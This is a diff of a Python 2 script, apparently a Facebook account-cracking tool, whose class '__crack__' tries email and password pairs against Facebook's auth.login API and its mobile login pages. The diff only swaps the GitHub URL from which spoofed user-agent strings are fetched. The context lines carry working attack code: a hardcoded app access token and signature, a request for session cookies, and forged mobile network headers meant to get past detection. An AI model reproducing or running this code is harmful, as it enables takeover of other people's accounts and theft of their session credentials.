@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 # coding=utf-8
-# code by zugendro
+# code by Zugendro
 
 import os
 try:
@@ -584,7 +584,7 @@ class __crack__:
             try:
             	_zugendro = open('ngoke.txt', 'r').read()
             except (KeyError, IOError):
-            	_zugendro = requests.get('https://raw.githubusercontent.com/zugendro/new/main/data/user_agent.txt').text.strip()
+            	_zugendro = requests.get('https://raw.githubusercontent.com/zugendro/ua/main/ua.txt').text.strip()
             headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _zugendro, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
             api = 'https://b-api.facebook.com/method/auth.login'
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
@@ -634,7 +634,7 @@ class __crack__:
             try:
             	_zugendro = open('ngoke.txt', 'r').read()
             except (KeyError, IOError):
-            	_zugendro = requests.get('https://raw.githubusercontent.com/zugendro/new/main/data/user_agent.txt').text.strip()
+            	_zugendro = requests.get('https://raw.githubusercontent.com/zugendro/ua/main/ua.txt').text.strip()
             ses = requests.Session()
             ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_zugendro,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get("https://mbasic.facebook.com")
@@ -685,7 +685,7 @@ class __crack__:
             try:
             	_zugendro = open('ngoke.txt', 'r').read()
             except (KeyError, IOError):
-            	_zugendro = requests.get('https://raw.githubusercontent.com/zugendro/new/main/data/user_agent.txt').text.strip()
+            	_zugendro = requests.get('https://raw.githubusercontent.com/zugendro/ua/main/ua.txt').text.strip()
             ses = requests.Session()
             ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_zugendro,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get("https://m.facebook.com")
